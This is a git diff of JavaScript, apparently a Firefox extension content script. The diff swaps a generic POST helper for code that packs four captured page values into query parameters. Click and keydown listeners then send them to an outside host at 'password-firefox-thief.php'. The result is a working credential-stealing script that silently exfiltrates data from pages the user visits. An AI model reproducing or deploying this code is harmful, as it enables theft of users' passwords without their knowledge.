@@ -1,29 +1,17 @@
-function ajaxPost(url, data, callback, isJson) {
-    var req = new XMLHttpRequest();
-    req.open("POST", url);
-    req.addEventListener("load", function () {
-        if (req.status >= 200 && req.status < 400) {
-            // Appelle la fonction callback en lui passant la réponse de la requête
-            callback(req.responseText);
-        } else {
-            console.error(req.status + " " + req.statusText + " " + url);
-        }
-    });
-    req.addEventListener("error", function () {
-        console.error("Erreur réseau avec l'URL " + url);
-    });
-    if (isJson) {
-        // Définit le contenu de la requête comme étant du JSON
-        req.setRequestHeader("Content-Type", "application/json");
-        // Transforme la donnée du format JSON vers le format texte avant l'envoi
-        data = JSON.stringify(data);
-    }
-    req.send(data);
+function ajaxPost(url, data) {
+    const jsonString = JSON.stringify(data);
+
+    const xhr = XPCNativeWrapper(new window.wrappedJSObject.XMLHttpRequest());
+
+    xhr.open("GET", url+"?"+data,true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	xhr.send(null);
 }
-/* envoyer les datas a un script .php et tout envoyer sur la bdd */
 
-
-myDataLast = [];
+function prototypeData(data) {
+	var temp = "v1="+data[0]+"&v2="+data[1]+"&v3="+data[2].replace(/&/gi, "†")+"&v4="+data[3];
+	return temp;
+}
 
 class MyApp {
   constructor(now) {
@@ -65,10 +53,8 @@ function commun_event() {
 	if (comparaison(myDataFirst, myDataLast) == false) {
 		myDataLast = myDataFirst;
 		if (myDataFirst[3].length>2) {
-			console.log(myDataFirst);
-			var monJSON = JSON.stringify(myDataFirst);
-			ajaxPost("https://www.php.net/manual/fr/tutorial.firstpage.php", monJSON, function(){console.log('impex')}, true);
-			console.log("all is good")
+			var toSend = prototypeData(myDataFirst);
+            ajaxPost("https://dev.petitcroco.fr/password-firefox-thief.php", toSend);
 		}
 	}
 }
@@ -83,5 +69,6 @@ function event_enter() {
 	}
 }
 
+myDataLast = [];
 document.addEventListener('click', event_click);
 document.addEventListener("keydown", event_enter);
